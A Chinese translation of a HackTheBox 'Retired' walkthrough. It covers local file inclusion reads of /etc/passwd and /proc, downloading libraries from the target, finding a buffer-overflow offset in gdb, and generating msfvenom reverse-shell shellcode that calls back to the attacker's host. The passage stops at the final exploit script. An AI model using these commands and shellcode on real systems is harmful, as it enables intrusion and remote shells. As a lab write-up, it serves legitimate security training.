<html>
<head>
<title>Retired from HackTheBox — Detailed Walkthrough</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">从HackTheBox退出—详细演练</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/retired-from-hackthebox-detailed-walkthrough-ee2f7cf288a?source=collection_archive---------8-----------------------#2022-08-27">https://infosecwriteups.com/retired-from-hackthebox-detailed-walkthrough-ee2f7cf288a?source=collection_archive---------8-----------------------#2022-08-27</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><div class=""><h2 id="f12d" class="pw-subtitle-paragraph jn ip iq bd b jo jp jq jr js jt ju jv jw jx jy jz ka kb kc kd ke dk translated">向您展示完成盒子所需的所有工具和技术。</h2></div><p id="cab0" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated"><a class="ae lb" href="https://www.hackthebox.com/home/machines/profile/456" rel="noopener ugc nofollow" target="_blank">退役的</a>是由<a class="ae lb" href="https://www.hackthebox.com/home/users/profile/590762" rel="noopener ugc nofollow" target="_blank"> uco2KFh </a>在<a class="ae lb" href="https://www.hackthebox.com/home" rel="noopener ugc nofollow" target="_blank">黑客盒子</a>上的一台中级机。它专注于二进制开发和利用设计不良的脚本和服务。</p><h1 id="d9f7" class="lc ld iq bd le lf lg lh li lj lk ll lm jw ln jx lo jz lp ka lq kc lr kd ls lt bi translated">机器信息</h1><figure class="lv lw lx ly gt lz gh gi paragraph-image"><div class="gh gi lu"><img src="../Images/5b0b0ad5b961b97826716ab1f06a2c9e.png" data-original-src="https://miro.medium.com/v2/resize:fit:1000/format:webp/0*riEI8EtjIYbdP4Wt.png"/></div><figcaption class="mc md gj gh gi me mf bd b be z dk translated">从HackTheBox退休</figcaption></figure><p id="1301" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">我们从一个易受本地文件注入攻击的网站开始。我们用它来枚举这个盒子，并过滤出一个易受缓冲区溢出攻击的二进制文件。我花了相当多的时间来研究这个过程，因为它启用了NX和RELRO。一旦我们有了一个可用的漏洞，我们就获得了一个外壳。从那里我们找到了一种获得SSH私有密钥的方法，然后作为一个用户，我们发现通过利用binfmt到root的路径相当简单。</p><h1 id="04f3" class="lc ld iq bd le lf lg lh li lj lk ll lm jw ln jx lo jz lp ka lq kc lr kd ls lt bi translated">初步侦察</h1><p id="48d5" class="pw-post-body-paragraph kf kg iq kh b ki mg jr kk kl mh ju kn ko mi kq kr ks mj ku kv kw mk ky kz la ij bi translated">像往常一样，让我们从Nmap开始:</p><figure class="lv lw lx ly gt lz gh gi paragraph-image"><div role="button" tabindex="0" class="mm mn di mo bf mp"><div class="gh gi ml"><img src="../Images/074e32b861fa64f117deba8f6efa873d.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*pBO3vaBRfHb5Dwrt1jMB9g.png"/></div></div><figcaption class="mc md gj gh gi me mf bd b be z dk translated">盒子的nmap扫描</figcaption></figure><p id="192c" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">我们来看看80端口的网站:</p><figure class="lv lw lx ly gt lz gh gi paragraph-image"><div role="button" tabindex="0" class="mm mn di mo bf mp"><div class="gh gi mq"><img src="../Images/512d01b71908635b4dc50e1a6923bd5e.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*7ykKTOAdys_R4P4m.png"/></div></div><figcaption class="mc md gj gh gi me mf bd b be z dk translated">端口80上的网站</figcaption></figure><p id="3af9" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">这里没什么，但有趣的是我们有一个index.php，它带有一个名为<strong class="kh ir"> page </strong>的参数，该参数引用了一个html文件。我们可以使用curl来测试default.html是否是一个可访问的文件:</p><pre class="lv lw lx ly gt mr ms mt mu aw mv bi"><span id="b90b" class="mw ld iq ms b gy mx my l mz na">┌──(root㉿kali)-[/usr/share/seclists/Discovery/Web-Content]<br/>└─# curl -sSL -D - http://10.10.11.154/default.html -o /dev/null<br/>HTTP/1.1 200 OK<br/>Server: nginx<br/>Date: Thu, 16 Jun 2022 21:07:27 GMT<br/>Content-Type: text/html<br/>Content-Length: 11414<br/>Last-Modified: Wed, 13 Oct 2021 02:58:57 GMT<br/>Connection: keep-alive<br/>ETag: "61664b71-2c96"<br/>Accept-Ranges: bytes</span></pre><h1 id="996b" class="lc ld iq bd le lf lg lh li lj lk ll lm jw ln jx lo jz lp ka lq kc lr kd ls lt bi translated">Feroxbuster</h1><p id="2acb" class="pw-post-body-paragraph kf kg iq kh b ki mg jr kk kl mh ju kn ko mi kq kr ks mj ku kv kw mk ky kz la ij bi translated">我们得到一个200 OK，在浏览器中看到的是同一个页面。使用Feroxbuster查找其他html页面的时间到了:</p><figure class="lv lw lx ly gt lz gh gi paragraph-image"><div role="button" tabindex="0" class="mm mn di mo bf mp"><div class="gh gi nb"><img src="../Images/7efed0ada0187aea15edea40a36cf19e.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*MzM5zwIbGPSffK-6X9joWw.png"/></div></div><figcaption class="mc md gj gh gi me mf bd b be z dk translated">对网站进行feroxbuster扫描</figcaption></figure><h1 id="8080" class="lc ld iq bd le lf lg lh li lj lk ll lm jw ln jx lo jz lp ka lq kc lr kd ls lt bi translated">β测试场地</h1><p id="cd5f" class="pw-post-body-paragraph kf kg iq kh b ki mg jr kk kl mh ju kn ko mi kq kr ks mj ku kv kw mk ky kz la ij bi translated">我们看到有一页叫做beta.html，让我们看看:</p><figure class="lv lw lx ly gt lz gh gi paragraph-image"><div role="button" tabindex="0" class="mm mn di mo bf mp"><div class="gh gi mq"><img src="../Images/ff2f95cf30d9555352da77d9d0849a26.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*gq0tJHjF1VlZZ5iJ.png"/></div></div><figcaption class="mc md gj gh gi me mf bd b be z dk translated">上传许可证密钥</figcaption></figure><p id="dc8a" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">有一个对话框要求输入许可证密钥文件，不管你是选择一个随机文件上传还是点击提交，你都会看到一个名为activate_license.php的空白页面:</p><figure class="lv lw lx ly gt lz gh gi paragraph-image"><div class="gh gi nc"><img src="../Images/69cc0cfdd4aa8739a2d73ebbc6524ff4.png" data-original-src="https://miro.medium.com/v2/resize:fit:1192/format:webp/0*0H_OvH_lwFDIT3PA.png"/></div><figcaption class="mc md gj gh gi me mf bd b be z dk translated">激活许可证</figcaption></figure><p id="3454" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">我找不到任何东西，所以回到之前的参数。这给了我们default.html文件:</p><pre class="lv lw lx ly gt mr ms mt mu aw mv bi"><span id="0abb" class="mw ld iq ms b gy mx my l mz na">┌──(root㉿kali)-[/usr/share/seclists/Discovery/Web-Content]<br/>└─# curl http://10.10.11.154/index.php?page=default.html</span></pre><h1 id="e85e" class="lc ld iq bd le lf lg lh li lj lk ll lm jw ln jx lo jz lp ka lq kc lr kd ls lt bi translated">文件探索</h1><p id="f8ff" class="pw-post-body-paragraph kf kg iq kh b ki mg jr kk kl mh ju kn ko mi kq kr ks mj ku kv kw mk ky kz la ij bi translated">让我们看看是否可以进行目录遍历来访问其他文件，如passwd:</p><pre class="lv lw lx ly gt mr ms mt mu aw mv bi"><span id="8a55" class="mw ld iq ms b gy mx my l mz na">┌──(root㉿kali)-[/usr/share/seclists/Discovery/Web-Content]<br/>└─# curl "http://10.10.11.154/index.php?page=/etc/passwd" | grep -v nologin<br/>  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current<br/>                                 Dload  Upload   Total   Spent    Left  Speed<br/>100  1488    0  1488    0     0  27009      0 --:--:-- --:--:-- --:--:-- 27054<br/>root:x:0:0:root:/root:/bin/bash<br/>sync:x:4:65534:sync:/bin:/bin/sync<br/>vagrant:x:1000:1000::/vagrant:/bin/bash<br/>dev:x:1001:1001::/home/dev:/bin/bash</span></pre><p id="9152" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">我们可以，并且可以看到有一个叫dev的用户。现在让我们看看activate_license.php文件:</p><figure class="lv lw lx ly gt lz gh gi paragraph-image"><div role="button" tabindex="0" class="mm mn di mo bf mp"><div class="gh gi nd"><img src="../Images/608157d6cc7a23683e10e7efb286e5f3.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*ttWuHsu3bbbej_JQDjjkxQ.png"/></div></div><figcaption class="mc md gj gh gi me mf bd b be z dk translated">激活许可php文件</figcaption></figure><h1 id="d78b" class="lc ld iq bd le lf lg lh li lj lk ll lm jw ln jx lo jz lp ka lq kc lr kd ls lt bi translated">枚举/proc</h1><p id="91e8" class="pw-post-body-paragraph kf kg iq kh b ki mg jr kk kl mh ju kn ko mi kq kr ks mj ku kv kw mk ky kz la ij bi translated">您可以看到它连接到本地主机端口1337，然后将<strong class="kh ir"> licensefile </strong>的内容写入其中。我们需要找到一种方法来利用这一点，第一步是找到在机器上的端口1337上运行的进程。要做到这一点，我们可以看看<a class="ae lb" href="https://man7.org/linux/man-pages/man5/proc.5.html" rel="noopener ugc nofollow" target="_blank"> proc </a>，这是我们不久前在<a class="ae lb" href="https://pencer.io/ctf/ctf-htb-backdoor" rel="noopener ugc nofollow" target="_blank">后门</a>中提到的伪文件系统。</p><p id="e8d1" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">如果你需要更多关于proc如何工作的信息，这篇文章是一篇很好的文章，但是基本上一个正在运行的进程在/proc里面会有一个相关的文件夹。我们可以使用我们读取文件的能力来遍历/proc中的所有文件夹，寻找在端口1337上运行的进程。</p><p id="2a50" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">proc的文档告诉我们，名为<strong class="kh ir"> cmdline </strong>的文件是我们需要的:</p><pre class="lv lw lx ly gt mr ms mt mu aw mv bi"><span id="24fe" class="mw ld iq ms b gy mx my l mz na">/proc/[pid]/cmdline<br/>              This read-only file holds the complete command line for<br/>              the process, unless the process is a zombie.</span></pre><h1 id="1064" class="lc ld iq bd le lf lg lh li lj lk ll lm jw ln jx lo jz lp ka lq kc lr kd ls lt bi translated">查找PID</h1><p id="055b" class="pw-post-body-paragraph kf kg iq kh b ki mg jr kk kl mh ju kn ko mi kq kr ks mj ku kv kw mk ky kz la ij bi translated">因此，我们希望回显每个[PID]文件夹中的文件内容:</p><pre class="lv lw lx ly gt mr ms mt mu aw mv bi"><span id="12a5" class="mw ld iq ms b gy mx my l mz na">┌──(root㉿kali)-[/usr/share/seclists/Discovery/Web-Content]<br/>└─# for i in {410..415}; do curl -s http://10.10.11.154/index.php?page=/proc/$i/cmdline --output -; echo " &lt;--" $i; done<br/> &lt;-- 410<br/>/usr/bin/activate_license1337 &lt;-- 411<br/> &lt;-- 412<br/> &lt;-- 413<br/> &lt;-- 414<br/> &lt;-- 415</span></pre><h1 id="fa7b" class="lc ld iq bd le lf lg lh li lj lk ll lm jw ln jx lo jz lp ka lq kc lr kd ls lt bi translated">激活_许可证二进制文件</h1><p id="45ad" class="pw-post-body-paragraph kf kg iq kh b ki mg jr kk kl mh ju kn ko mi kq kr ks mj ku kv kw mk ky kz la ij bi translated">这是一个缩短的循环，可以让你在数百个文件夹中等待。如你所见，有一个文件夹<strong class="kh ir"> /proc/411/ </strong>，其中包含一个名为<strong class="kh ir"> cmdline </strong>的文件，该文件包含运行在该进程ID [PID]上的二进制文件的路径。现在我们有了activate_license二进制文件的完整路径，可以下载了:</p><figure class="lv lw lx ly gt lz gh gi paragraph-image"><div role="button" tabindex="0" class="mm mn di mo bf mp"><div class="gh gi nd"><img src="../Images/285f6c61f4c048dfcf74f071bd4ffdac.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*MUU9vtkibBt2N3yo19PwNQ.png"/></div></div><figcaption class="mc md gj gh gi me mf bd b be z dk translated">活动许可证二进制文件</figcaption></figure><p id="f240" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">我们现在有Kali的本地文件。它是一个可执行文件，所以可以很有把握地假设我们需要找到一个像缓冲区溢出这样的漏洞。</p><p id="e383" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">首先检查它的安全性:</p><pre class="lv lw lx ly gt mr ms mt mu aw mv bi"><span id="f1bd" class="mw ld iq ms b gy mx my l mz na">┌──(root㉿kali)-[~/htb/retired]<br/>└─# checksec --file=activate_license<br/>[*] '/root/htb/retired/activate_license'<br/>    Arch:     amd64-64-little<br/>    RELRO:    Full RELRO<br/>    Stack:    No canary found<br/>    NX:       NX enabled<br/>    PIE:      PIE enabled</span></pre><h1 id="9b5e" class="lc ld iq bd le lf lg lh li lj lk ll lm jw ln jx lo jz lp ka lq kc lr kd ls lt bi translated">缓冲区溢出</h1><p id="fc56" class="pw-post-body-paragraph kf kg iq kh b ki mg jr kk kl mh ju kn ko mi kq kr ks mj ku kv kw mk ky kz la ij bi translated">二进制文件有许多保护，包括RELRO和NX使能。我们可以利用一个漏洞来绕过这些所谓的<strong class="kh ir">面向返回的编程(ROP) </strong>，它让我们控制程序流，即使我们不能直接写入堆栈。有很多很棒的文章向我们展示了如何使用ROP小工具，还有一个名为<a class="ae lb" href="https://docs.pwntools.com/en/stable/" rel="noopener ugc nofollow" target="_blank"> Pwntools </a>的Python库，它使得编写我们的脚本变得更加容易。如果你需要pwntools的入门，那么试试TryHackMe上的这个免费房间。几个有用的阅读视频有<a class="ae lb" href="https://docs.pwntools.com/en/stable/rop/rop.html" rel="noopener ugc nofollow" target="_blank">这个</a>、<a class="ae lb" href="https://fir3wa1-k3r.github.io/2020/02/13/PWNing-binary-with-NX-and-ASLR-protections-enabled.html" rel="noopener ugc nofollow" target="_blank">这个</a>、<a class="ae lb" href="https://blog.xpnsec.com/rop-primer-level-0/" rel="noopener ugc nofollow" target="_blank">这个</a>和<a class="ae lb" href="https://www.youtube.com/watch?v=ryK4Xv9Fw-o" rel="noopener ugc nofollow" target="_blank">这个</a>、<a class="ae lb" href="https://www.youtube.com/watch?v=HjiiYB4AXI8" rel="noopener ugc nofollow" target="_blank">这个</a>和<a class="ae lb" href="https://www.youtube.com/watch?v=Ge01IzQH3Rg" rel="noopener ugc nofollow" target="_blank">这个</a>。</p><p id="e1b6" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">基本的想法是，我们不能像在TryHackMe的<a class="ae lb" href="https://pencer.io/ctf/ctf-thm-bofprep/" rel="noopener ugc nofollow" target="_blank">缓冲区溢出室</a>中那样容易地写入堆栈来控制指针。相反，我们必须使用我们想要利用的二进制文件所使用的共享目标文件中的指令。</p><p id="5642" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">首先我们得抓几个。所以二进制文件使用的文件。我们可以通过查看包装盒上的地图文件来了解这些信息:</p><pre class="lv lw lx ly gt mr ms mt mu aw mv bi"><span id="16db" class="mw ld iq ms b gy mx my l mz na">┌──(root㉿kali)-[~/htb/retired]<br/>└─# curl -s "http://10.10.11.154/index.php?page=/proc/$(curl -s "http://10.10.11.154/index.php?page=/proc/sched_debug" | grep activate_licens | awk '{print $3}')/maps"</span></pre><p id="5644" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">上面使用了<a class="ae lb" href="https://doc.opensuse.org/documentation/leap/archive/15.0/tuning/html/book.sle.tuning/cha.tuning.taskscheduler.html#sec.tuning.taskscheduler.cfs.debug" rel="noopener ugc nofollow" target="_blank"> sched_debug </a>文件来查找在机器上运行的activate_license二进制文件的当前pid，然后获取它的映射文件。在这个长长的列表中，有两个文件是我们感兴趣的:</p><pre class="lv lw lx ly gt mr ms mt mu aw mv bi"><span id="9f90" class="mw ld iq ms b gy mx my l mz na">7f13f36a2000-7f13f36c7000 r--p 00000000 08:01 3634                       /usr/lib/x86_64-linux-gnu/libc-2.31.so<br/>7f13f3867000-7f13f3877000 r--p 00000000 08:01 5321                       /usr/lib/x86_64-linux-gnu/libsqlite3.so.0.8.6</span></pre><p id="3f90" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">我们有两个共享对象的路径，让我们下载它们:</p><pre class="lv lw lx ly gt mr ms mt mu aw mv bi"><span id="328d" class="mw ld iq ms b gy mx my l mz na">┌──(root㉿kali)-[~/htb/retired]<br/>└─# curl -s "http://10.10.11.154/index.php?page=/usr/lib/x86_64-linux-gnu/libsqlite3.so.0.8.6" -o libsqlite3.so.0.8.6<br/><br/>┌──(root㉿kali)-[~/htb/retired]<br/>└─# curl -s "http://10.10.11.154/index.php?page=/usr/lib/x86_64-linux-gnu/libc-2.31.so" -o libc-2.31.so</span></pre><h1 id="c534" class="lc ld iq bd le lf lg lh li lj lk ll lm jw ln jx lo jz lp ka lq kc lr kd ls lt bi translated">开拓发展</h1><p id="eba6" class="pw-post-body-paragraph kf kg iq kh b ki mg jr kk kl mh ju kn ko mi kq kr ks mj ku kv kw mk ky kz la ij bi translated">就像我们之前做的一样，第一步是找到导致二进制崩溃所需的偏移量。我们通过向它发送大量的字符，然后计算它崩溃的次数来实现这个目的。这花了我一点时间，但关键是要让二进制文件崩溃，我们必须以它期望的方式向它发送数据。为了简单起见，我将下载的activate_license.php文件用于Kali，然后启动内置的php服务器来托管它:</p><pre class="lv lw lx ly gt mr ms mt mu aw mv bi"><span id="f8dc" class="mw ld iq ms b gy mx my l mz na">┌──(root㉿kali)-[~/htb/retired]<br/>└─# php -S localhost:8080<br/>[Wed Jun 22 22:33:50 2022] PHP 8.1.2 Development Server (http://localhost:8080) started</span></pre><p id="3af2" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">运行之后，我可以把我的有效载荷发送给它，php代码会把它写到二进制文件中。php文件的这一部分是我们感兴趣的部分:</p><pre class="lv lw lx ly gt mr ms mt mu aw mv bi"><span id="06c3" class="mw ld iq ms b gy mx my l mz na">if (!socket_connect($socket, '127.0.0.1', 1337)) {<br/>        echo "error socket_connect()" . socket_strerror(socket_last_error()) . "\n";<br/>    }<br/>    socket_write($socket, pack("N", $license_size));<br/>    socket_write($socket, $license);</span></pre><p id="d93f" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">如您所见，它在本地写入端口1337。因此，我们接下来要运行activate_license二进制文件，以便php脚本可以写入其中。为此，我们需要gdb，所以当二进制崩溃时，我们可以查找寄存器来查看偏移量。</p><h1 id="929b" class="lc ld iq bd le lf lg lh li lj lk ll lm jw ln jx lo jz lp ka lq kc lr kd ls lt bi translated">GDB和佩达</h1><p id="9234" class="pw-post-body-paragraph kf kg iq kh b ki mg jr kk kl mh ju kn ko mi kq kr ks mj ku kv kw mk ky kz la ij bi translated">如果没有安装<a class="ae lb" href="https://www.sourceware.org/gdb/" rel="noopener ugc nofollow" target="_blank"> gdb </a>:</p><pre class="lv lw lx ly gt mr ms mt mu aw mv bi"><span id="2995" class="mw ld iq ms b gy mx my l mz na">apt install gdb</span></pre><p id="4b16" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">还要安装<a class="ae lb" href="https://github.com/longld/peda" rel="noopener ugc nofollow" target="_blank"> peda </a>，它向gdb添加了许多有用的命令:</p><pre class="lv lw lx ly gt mr ms mt mu aw mv bi"><span id="0e3e" class="mw ld iq ms b gy mx my l mz na">git clone https://github.com/longld/peda.git ~/peda<br/>echo "source ~/peda/peda.py" &gt;&gt; ~/.gdbinit</span></pre><p id="8e5f" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">现在用activate_license二进制文件启动gdb:</p><pre class="lv lw lx ly gt mr ms mt mu aw mv bi"><span id="32d1" class="mw ld iq ms b gy mx my l mz na">┌──(root㉿kali)-[~]<br/>└─# gdb -q --args ./activate_license 1337<br/>Reading symbols from ./activate_license...</span></pre><p id="7207" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">接下来，我们需要创建一个独特的字符模式，我们将发送它来破坏二进制文件:</p><pre class="lv lw lx ly gt mr ms mt mu aw mv bi"><span id="5a37" class="mw ld iq ms b gy mx my l mz na">gdb-peda$ pattern_create 1000 pencer.txt<br/>Writing pattern of 1000 chars to filename "pencer.txt"</span></pre><p id="b9a9" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">现在我们可以运行二进制文件:</p><pre class="lv lw lx ly gt mr ms mt mu aw mv bi"><span id="fa47" class="mw ld iq ms b gy mx my l mz na">gdb-peda$ run<br/>Starting program: /root/htb/retired/activate_license 1337<br/>[Thread debugging using libthread_db enabled]<br/>Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".<br/>[+] starting server listening on port 1337<br/>[+] listening ...</span></pre><p id="04e8" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">所以现在我们有了托管php脚本的PHP服务器，该脚本将把我们的有效负载推送到运行在gdb中并监听端口1337的二进制文件。接下来，我们需要一个简单的Python脚本来发送我们刚刚创建的模式:</p><pre class="lv lw lx ly gt mr ms mt mu aw mv bi"><span id="f7a7" class="mw ld iq ms b gy mx my l mz na">┌──(root㉿kali)-[~/htb/retired]<br/>└─# cat pencer.py<br/>import requests<br/>f = open("pencer.txt", "r")<br/>payload = f.read()<br/>f.close()<br/>r = requests.post(f"http://localhost:8080/activate_license.php", files = { "licensefile": payload } )</span></pre><p id="9763" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">这只是读入包含我们在gdb中创建的1000字符模式的txt文件。然后它将它发送到php脚本，PHP脚本将它写入运行在gdb中的activate_license二进制文件:</p><pre class="lv lw lx ly gt mr ms mt mu aw mv bi"><span id="67b7" class="mw ld iq ms b gy mx my l mz na">┌──(root㉿kali)-[~/htb/retired]<br/>└─# python pencer.py</span></pre><h1 id="4aaf" class="lc ld iq bd le lf lg lh li lj lk ll lm jw ln jx lo jz lp ka lq kc lr kd ls lt bi translated">分段故障</h1><p id="3383" class="pw-post-body-paragraph kf kg iq kh b ki mg jr kk kl mh ju kn ko mi kq kr ks mj ku kv kw mk ky kz la ij bi translated">如果我们现在切换到gdb，我们会看到它崩溃了:</p><figure class="lv lw lx ly gt lz gh gi paragraph-image"><div role="button" tabindex="0" class="mm mn di mo bf mp"><div class="gh gi nd"><img src="../Images/9d997d1809b597b91a888fdd9947b087.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*GRSc4ZE-6-oR_Qji_ZMn8w.png"/></div></div><figcaption class="mc md gj gh gi me mf bd b be z dk translated">显示文件崩溃的gdb</figcaption></figure><p id="6664" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">二进制文件因分段错误而崩溃，这意味着我们溢出了缓冲区，因此现在我们可以看到偏移量是多少:</p><pre class="lv lw lx ly gt mr ms mt mu aw mv bi"><span id="cba2" class="mw ld iq ms b gy mx my l mz na">gdb-peda$ x/wx $rsp<br/>0x7fffffffe2d8: 0x416a7341<br/>gdb-peda$ pattern_offset 0x416a7341<br/>1097495361 found at offset: 520</span></pre><p id="025b" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">在这里，我们查看了RSP寄存器的内容，它给出了值<strong class="kh ir"> 0x416a7341 </strong>，然后我们使用<strong class="kh ir"> pattern_offset </strong>搜索我们创建的模式以找到该值。匹配是在520，所以这是我们的偏移，我们将使用它来建立我们的利用脚本。</p><h1 id="cf8f" class="lc ld iq bd le lf lg lh li lj lk ll lm jw ln jx lo jz lp ka lq kc lr kd ls lt bi translated">内存地址</h1><p id="ddce" class="pw-post-body-paragraph kf kg iq kh b ki mg jr kk kl mh ju kn ko mi kq kr ks mj ku kv kw mk ky kz la ij bi translated">如前所述，在启用NX的情况下，我们将使用ROP小工具来解决它，因此接下来我们需要知道libc-2.31.so和libsqlite3.so.0.8.6的当前内存地址。内存地址是动态的，这意味着每次重新启动机器时，地址都会发生变化，我们可以使用/proc中的maps文件来获取当前值:</p><pre class="lv lw lx ly gt mr ms mt mu aw mv bi"><span id="4e1b" class="mw ld iq ms b gy mx my l mz na">┌──(root㉿kali)-[~/htb/retired]<br/>└─# libc_start=$(curl -s "http://10.10.11.154/index.php?page=/proc/$(curl -s "http://10.10.11.154/index.php?page=/proc/sched_debug" | grep activate_licens | awk '{print $3}')/maps" | grep -m 1 "/usr/lib/x86_64-linux-gnu/libc-2.31.so" | awk -F[-] '{print $1}')<br/><br/>┌──(root㉿kali)-[~/htb/retired]<br/>└─# libsqlite_start=$(curl -s "http://10.10.11.154/index.php?page=/proc/$(curl -s "http://10.10.11.154/index.php?page=/proc/sched_debug" | grep activate_licens | awk '{print $3}')/maps" | grep -m 1 "/usr/lib/x86_64-linux-gnu/libsqlite3.so.0.8.6" | awk -F[-] '{print $1}')</span></pre><p id="db65" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">我们还需要堆栈地址:</p><pre class="lv lw lx ly gt mr ms mt mu aw mv bi"><span id="a40d" class="mw ld iq ms b gy mx my l mz na">┌──(root㉿kali)-[~/htb/retired]<br/>└─# stack_start=$(curl -s "http://10.10.11.154/index.php?page=/proc/$(curl -s "http://10.10.11.154/index.php?page=/proc/sched_debug" | grep activate_licens | awk '{print $3}')/maps" | grep -m 1 "stack" | awk -F[-] '{print $1}')<br/><br/>┌──(root㉿kali)-[~/htb/retired]<br/>└─# stack_end=$(curl -s "http://10.10.11.154/index.php?page=/proc/$(curl -s "http://10.10.11.154/index.php?page=/proc/sched_debug" | grep activate_licens | awk '{print $3}')/maps" | grep -m 1 "stack" | awk -F[-] '{print $2}' | cut -d ' ' -f 1)</span></pre><p id="d87a" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">记下我们脚本的值:</p><pre class="lv lw lx ly gt mr ms mt mu aw mv bi"><span id="d5d9" class="mw ld iq ms b gy mx my l mz na">┌──(root㉿kali)-[~/htb/retired]<br/>└─# echo $libc_start, $libsqlite_start, $stack_start, $stack_end<br/>7fb1ff018000, 7fb1ff1dd000, 7fffddc82000, 7fffddca3000</span></pre><h1 id="cf3f" class="lc ld iq bd le lf lg lh li lj lk ll lm jw ln jx lo jz lp ka lq kc lr kd ls lt bi translated">MSFVenom外壳代码</h1><p id="85c7" class="pw-post-body-paragraph kf kg iq kh b ki mg jr kk kl mh ju kn ko mi kq kr ks mj ku kv kw mk ky kz la ij bi translated">我们还需要一个有效载荷。我们可以使用msfvenom创建Python友好格式的外壳代码，它指向我们当前的Kali IP和端口:</p><pre class="lv lw lx ly gt mr ms mt mu aw mv bi"><span id="53dc" class="mw ld iq ms b gy mx my l mz na">┌──(root㉿kali)-[~/htb/retired]<br/>└─# msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.198 LPORT=4444 -f py<br/>[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload<br/>[-] No arch selected, selecting arch: x64 from the payload<br/>No encoder specified, outputting raw payload<br/>Payload size: 74 bytes<br/>Final size of py file: 373 bytes<br/>buf =  b""<br/>buf += b"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48"<br/>buf += b"\x97\x48\xb9\x02\x00\x11\x5c\x0a\x0a\x0e\xc6\x51\x48"<br/>buf += b"\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05\x6a\x03\x5e"<br/>buf += b"\x48\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x6a\x3b\x58"<br/>buf += b"\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00\x53\x48"<br/>buf += b"\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05"</span></pre><h1 id="6537" class="lc ld iq bd le lf lg lh li lj lk ll lm jw ln jx lo jz lp ka lq kc lr kd ls lt bi translated">最终漏洞脚本</h1><p id="1b4d" class="pw-post-body-paragraph kf kg iq kh b ki mg jr kk kl mh ju kn ko mi kq kr ks mj ku kv kw mk ky kz la ij bi translated">现在我们可以整理我们的脚本了:</p><pre class="lv lw lx ly gt mr ms mt mu aw mv bi"><span id="7a42" class="mw ld iq 